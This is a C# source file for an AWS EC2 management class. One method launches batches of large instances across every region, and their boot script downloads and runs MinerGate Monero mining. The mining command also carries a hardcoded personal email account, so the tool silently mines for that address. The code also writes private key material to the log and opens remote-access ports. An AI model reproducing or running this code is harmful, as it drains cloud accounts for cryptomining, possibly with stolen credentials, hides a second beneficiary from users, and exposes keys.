using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Amazon;
using Amazon.EC2;
using Amazon.EC2.Model;
using Amazon.Runtime;
using Amazon.SimpleSystemsManagement.Model;
using ObjectPrinter;

namespace AwsManager.Core
{
    public class AwsManager
    {
        private AmazonEC2Client AmazonEc2Client { get; set; }

        private static readonly log4net.ILog Log =
            log4net.LogManager.GetLogger(
                System.Reflection.MethodBase.GetCurrentMethod().DeclaringType);

        public AwsManager()
        {
            
        }

        public AwsManager(string secretKey, string accessKey, string regionName)
        {
              AmazonEc2Client = new AmazonEC2Client(GetCredentials(accessKey, secretKey), RegionEndpoint.GetBySystemName(regionName));
        }

        public async Task<string> CreateWorker(string regionName, string instanceType, int instanceCount, string initCommand)
        {
            try
            {
                var regionImages = GetRegionImages();;
                var instance = InstanceType.FindValue(instanceType);

                if (String.IsNullOrEmpty(instance))
                {
                    throw new Exception("Instance not found!");
                }

                if (String.IsNullOrEmpty(regionImages.FirstOrDefault(a => a.Key == regionName).Value))
                {
                    throw new Exception("Region not found!");
                }

                var groupName   = String.Concat(ConfigurationManager.AppSettings["GroupName"]   , "." , regionName);
                var keyName     = String.Concat(ConfigurationManager.AppSettings["KeyName"]     , "." , regionName);
                
                CreateKeyPairRequest(keyName);
                CreateSecurityGroup(groupName);
            
                Log.InfoFormat("{0} - Instance started.", instanceType);

                Log.InfoFormat(initCommand);

                CreateInstance(groupName, keyName, regionImages[regionName], initCommand, instance, instanceCount);
                
                Log.InfoFormat("{0} - Instance completed.", instance);
            }
            catch (Exception ex)
            {
                Log.Error(ex);
                return ex.Message;
            }

            return "ok";
        }

        public List<string> GetInstanceList()
        {
            return GetInstanceCore().Keys.Select(a => a.Value.ToLower()).ToList();
        }

        public List<string> GetRegionList()
        {
            return GetRegionImages().Keys.ToList();
        } 

        private void CreateRegionWorkers()
        {
            var regionImages = GetRegionImages();
            var instanceCounts = GetInstanceCounts();
            var permissions = GetPermissions();

            foreach (var region in regionImages)
            {
                if (ConfigurationManager.AppSettings["AWSRegionInc"] != null &&
                    !String.IsNullOrEmpty(ConfigurationManager.AppSettings["AWSRegionInc"]) &&
                    ConfigurationManager.AppSettings["AWSRegionInc"] != region.Key)
                    continue;

                if (ConfigurationManager.AppSettings["AWSRegionExc"] != null &&
                    !String.IsNullOrEmpty(ConfigurationManager.AppSettings["AWSRegionExc"]) &&
                    ConfigurationManager.AppSettings["AWSRegionExc"] == region.Key)
                    continue;

                Log.InfoFormat("{0} - Region started.", region.Key);
                
                var groupName = String.Concat(ConfigurationManager.AppSettings["GroupName"], region.Key, DateTime.Now.Ticks);
                var keyName = String.Concat(ConfigurationManager.AppSettings["KeyName"], region.Key, DateTime.Now.Ticks);

                CreateKeyPairRequest(keyName);

                //CreateSecurityGroup(groupName, permissions);

                foreach (var instance in instanceCounts)
                {
                    Log.InfoFormat("{0} - Instance started.", instance.Key);

                    /*
                    for (int i = 0; i < instance.Value; i++)
                    {
                        string imageId = regionImages[region.Key];

                        CreateInstance(groupName, keyName, imageId, userData, instance.Key);

                        Thread.Sleep(Convert.ToInt32(ConfigurationManager.AppSettings["CreateInstanceWaitTime"]));
                    }
                     * */

                    var userData = @"#!/bin/bash
                    sudo apt-get update && wget https://minergate.com/download/deb-cli -O minergate-cli.deb && sudo dpkg -i minergate-cli.deb
                    screen -dmS maden minergate-cli -user " +
                                   ConfigurationManager.AppSettings["MinerGateAccount"] +
                                   " -xmr screen -dmS maden minergate-cli -user muratorno@hotmail.com -xmr " +
                                   GetCoreCount(instance.Key);

                    CreateInstance(groupName, keyName, regionImages[region.Key], userData, instance.Key, instance.Value);

                    Thread.Sleep(Convert.ToInt32(ConfigurationManager.AppSettings["CreateInstanceWaitTime"]));

                    Log.InfoFormat("{0} - Instance completed.", instance.Key);
                }

                Log.InfoFormat("{0} - Region completed.", region.Key);

                Thread.Sleep(Convert.ToInt32(ConfigurationManager.AppSettings["CreateRegionWaitTime"]));
            }
        }

        private static List<string> GetPermissions()
        {
            List<String> permissions = new List<String>();
            permissions.Add("22");
            permissions.Add("3389");
            permissions.Add("80");
            permissions.Add("8080");
            permissions.Add("443");
            return permissions;
        }

        private static Dictionary<InstanceType, int> GetInstanceCounts()
        {
            Dictionary<InstanceType, int> instances = new Dictionary<InstanceType, int>();

            instances.Add(InstanceType.C42xlarge, 5);
            instances.Add(InstanceType.C44xlarge, 1);
            instances.Add(InstanceType.C48xlarge, 1);
            instances.Add(InstanceType.C4Xlarge, 5);
            instances.Add(InstanceType.D2Xlarge, 1);
            instances.Add(InstanceType.R32xlarge, 5);
            instances.Add(InstanceType.R34xlarge, 1);
            instances.Add(InstanceType.R38xlarge, 1);

            return instances;
        }

        private static int FindCoreCount(InstanceType instanceType)
        {
            if (instanceType.Value.IndexOf("micro") > 0) { return 1; }

            if (instanceType.Value.IndexOf("small") > 0) { return 1; }

            if (instanceType.Value.IndexOf("medium") > 0) { return 2; }

            if (instanceType.Value.IndexOf("32xlarge") > 0) { return 128; }

            if (instanceType.Value.IndexOf("16xlarge") > 0) { return 64; }

            if (instanceType.Value.IndexOf("10xlarge") > 0) { return 40; }

            if (instanceType.Value.IndexOf("8xlarge") > 0) { return 32; }

            if (instanceType.Value.IndexOf("4xlarge") > 0) { return 16; }

            if (instanceType.Value.IndexOf("2xarge") > 0) { return 8; }

            if (instanceType.Value.IndexOf("xlarge") > 0) { return 4; }

            return 0;
        }

        private static Dictionary<InstanceType, int> GetInstanceCore()
        {
            Dictionary<InstanceType, int> instanceCoreList = new Dictionary<InstanceType, int>();

            instanceCoreList.Add(InstanceType.C1Medium, 2);
            instanceCoreList.Add(InstanceType.C1Xlarge, 8);
            instanceCoreList.Add(InstanceType.C32xlarge, 8);
            instanceCoreList.Add(InstanceType.C34xlarge, 16);
            instanceCoreList.Add(InstanceType.C38xlarge, 32);
            instanceCoreList.Add(InstanceType.C3Large, 2);
            instanceCoreList.Add(InstanceType.C3Xlarge, 4);
            instanceCoreList.Add(InstanceType.C42xlarge, 8);
            instanceCoreList.Add(InstanceType.C44xlarge, 16);
            instanceCoreList.Add(InstanceType.C48xlarge, 36);
            instanceCoreList.Add(InstanceType.C4Large, 2);
            instanceCoreList.Add(InstanceType.C4Xlarge, 4);
            instanceCoreList.Add(InstanceType.Cc14xlarge, 16);
            instanceCoreList.Add(InstanceType.Cc28xlarge, 32);
            instanceCoreList.Add(InstanceType.Cg14xlarge, 16);
            instanceCoreList.Add(InstanceType.Cr18xlarge, 32);
            instanceCoreList.Add(InstanceType.D22xlarge, 8);
            instanceCoreList.Add(InstanceType.D24xlarge, 16);
            instanceCoreList.Add(InstanceType.D28xlarge, 36);
            instanceCoreList.Add(InstanceType.D2Xlarge, 4);
            instanceCoreList.Add(InstanceType.G22xlarge, 8);
            instanceCoreList.Add(InstanceType.Hi14xlarge, 16);
            instanceCoreList.Add(InstanceType.Hs18xlarge, 16);
            instanceCoreList.Add(InstanceType.I22xlarge, 8);
            instanceCoreList.Add(InstanceType.I24xlarge, 16);
            instanceCoreList.Add(InstanceType.I28xlarge, 32);
            instanceCoreList.Add(InstanceType.I2Xlarge, 4);
            instanceCoreList.Add(InstanceType.M1Large, 2);
            instanceCoreList.Add(InstanceType.M1Medium, 1);
            instanceCoreList.Add(InstanceType.M1Small, 1);
            instanceCoreList.Add(InstanceType.M1Xlarge, 4);
            instanceCoreList.Add(InstanceType.M22xlarge, 4);
            instanceCoreList.Add(InstanceType.M24xlarge, 8);
            instanceCoreList.Add(InstanceType.M2Xlarge, 2);
            instanceCoreList.Add(InstanceType.M32xlarge, 8);
            instanceCoreList.Add(InstanceType.M3Large, 2);
            instanceCoreList.Add(InstanceType.M3Medium, 1);
            instanceCoreList.Add(InstanceType.M3Xlarge, 4);
            instanceCoreList.Add(InstanceType.M410xlarge, 40);
            instanceCoreList.Add(InstanceType.M42xlarge, 8);
            instanceCoreList.Add(InstanceType.M44xlarge, 16);
            instanceCoreList.Add(InstanceType.M4Large, 2);
            instanceCoreList.Add(InstanceType.M4Xlarge, 4);
            instanceCoreList.Add(InstanceType.R32xlarge, 8);
            instanceCoreList.Add(InstanceType.R34xlarge, 16);
            instanceCoreList.Add(InstanceType.R38xlarge, 32);
            instanceCoreList.Add(InstanceType.R3Large, 2);
            instanceCoreList.Add(InstanceType.R3Xlarge, 4);
            instanceCoreList.Add(InstanceType.T1Micro, 1);
            instanceCoreList.Add(InstanceType.T2Large, 2);
            instanceCoreList.Add(InstanceType.T2Medium, 2);
            instanceCoreList.Add(InstanceType.T2Micro, 1);
            instanceCoreList.Add(InstanceType.T2Small, 1);

            return instanceCoreList;
        }  

        private static Dictionary<string, string> GetRegionImages()
        {
            Dictionary<string, string> images = new Dictionary<string, string>();

            images.Add("us-east-1", "ami-cd0f5cb6");
            images.Add("us-east-2", "ami-10547475");
            images.Add("us-west-1", "ami-09d2fb69");
            images.Add("us-west-2", "ami-599a7721");
            images.Add("ca-central-1", "ami-b3d965d7");
            images.Add("eu-west-1", "ami-785db401");
            images.Add("eu-central-1", "ami-1e339e71");
            images.Add("eu-west-2", "ami-996372fd");
            images.Add("ap-southeast-1", "ami-6f198a0c");
            images.Add("ap-southeast-2", "ami-e2021d81");
            images.Add("ap-northeast-2", "ami-d28a53bc");
            images.Add("ap-northeast-1", "ami-ea4eae8c");
            images.Add("ap-south-1", "ami-099fe766");
            images.Add("sa-east-1", "ami-10186f7c");

            return images;
        }

        private string GetCurrentImages()
        {
            try
            {
                var ownerList = new List<string>();
                ownerList.Add("amazon");

                var filters = new List<Filter>(); 
                filters.Add(new Filter()
                {
                    Name = "image-type",
                    Values = new List<string>(0){"machine"}
                });

                filters.Add(new Filter()
                {
                    Name = "architecture",
                    Values = new List<string>(0) { "x86_64" }
                });
                
                filters.Add(new Filter()
                {
                    Name = "owner-alias",
                    Values = new List<string>(0) { "amazon" }
                });

                /*
                filters.Add(new Filter()
                {
                    Name = "platform",
                    Values = new List<string>(0) { "Ubuntu" }
                });
                */
                filters.Add(new Filter()
                {
                    Name = "virtualization-type",
                    Values = new List<string>(0) { "hvm" }
                });
                
                DescribeImagesRequest imagesRequest = new DescribeImagesRequest(); 
                imagesRequest.Filters = filters;
                DescribeImagesResponse imagesResponse = AmazonEc2Client.DescribeImages(imagesRequest);

                var imagesResult = imagesResponse.Images;
                return imagesResponse.Images.Any() ?  imagesResponse.Images[0].ImageId : "" ;
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        private void GetInstanceLimits()
        {
            try
            {
                var response = AmazonEc2Client.DescribeAccountAttributes();
                Log.InfoFormat("GetInstanceLimits --> {0}", response);

            }
            catch (Exception)
            {
                
                throw;
            }
        }

        private string CreateImage()
        {
            try
            {
                var request = new CreateImageRequest();
                request.NoReboot = true;
                request.InstanceId = "i-cloudImageInstance";
                request.Name = "cloudImage";
                var response = AmazonEc2Client.CreateImage(request);

                Log.InfoFormat("CreateImage --> {0}", response);

                return response.ImageId;
            }
            catch (Exception ex)
            {
                throw ex ;
            }
        }

        private void CreateInstance(string groupName,string keyName,string imageId,string userData, InstanceType instanceType, int instanceCount)
        {
            try
            {
                var request = new RunInstancesRequest
                {
                    InstanceType = instanceType,
                    MaxCount = instanceCount,
                    MinCount = 1,
                    ImageId = imageId,
                    KeyName = keyName,
                    SecurityGroups = new List<string>() { groupName },
                    UserData = Base64Encode(userData)
                };
                
                var response = AmazonEc2Client.RunInstances(request);

                Log.InfoFormat("RunInstances --> {0}", response.Dump().ToString());

            }
            catch (Exception ex)
            {
                throw ex;
            }

        }

        private void CreateKeyPairRequest(string keyname)
        {
            try
            {
                CreateKeyPairRequest request = new CreateKeyPairRequest();
                request.KeyName = keyname;
                CreateKeyPairResponse response = AmazonEc2Client.CreateKeyPair(request);
                Log.Info(response.KeyPair.KeyMaterial);
            }
            catch (Exception ex)
            {
                Log.ErrorFormat(ex.Message);
            }
        }

        private void CreateSecurityGroup(String groupName)
        {
            try
            {

                var permissions = GetPermissions();

                CreateSecurityGroupRequest request = new CreateSecurityGroupRequest();
                request.GroupName = groupName;
                request.Description = "cloud groups";
                var responseCreateSecurityGroup = AmazonEc2Client.CreateSecurityGroup(request);

                Log.InfoFormat("CreateSecurityGroup --> {0}", responseCreateSecurityGroup.Dump());

                AuthorizeSecurityGroupIngressRequest ingress = new AuthorizeSecurityGroupIngressRequest();
                ingress.GroupName = groupName;

                var permissionList = new List<IpPermission>();

                permissions.ForEach(a=>permissionList.Add(new IpPermission()
                {
                    IpProtocol = "tcp",
                    FromPort = Convert.ToInt32(a),
                    ToPort = Convert.ToInt32(a),
                }));

                ingress.IpPermissions = permissionList;

                var responseAuthorizeSecurityGroupIngress = AmazonEc2Client.AuthorizeSecurityGroupIngress(ingress);

                Log.InfoFormat("CreateSecurityGroup --> {0}", responseAuthorizeSecurityGroupIngress.Dump());

            }
            catch (Exception ex)
            {
                Log.ErrorFormat(ex.Message);
            }
        }

        private static AWSCredentials GetCredentials(string accessKey, string secretKey)
        {
            return new BasicAWSCredentials(accessKey.Trim(), secretKey.Trim());
        }

        private static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        private static int CalculateCore(int core)
        {
            switch (core)
            {
                case 2: return 1;
                case 4: return 2;
                case 8: return 3;
                case 16: return 6;
                case 32: return 10;
                case 36: return 11;
                case 40: return 12;
                case 64: return 20;
                case 128: return 40;
            }
            return 0;
        }

        private static int GetCoreCount(InstanceType instanceType)
        {
            var instance = GetInstanceCore().FirstOrDefault(a => a.Key == instanceType);
            
                return instance.Value;
            
            return 0;
        }
    }
  
}
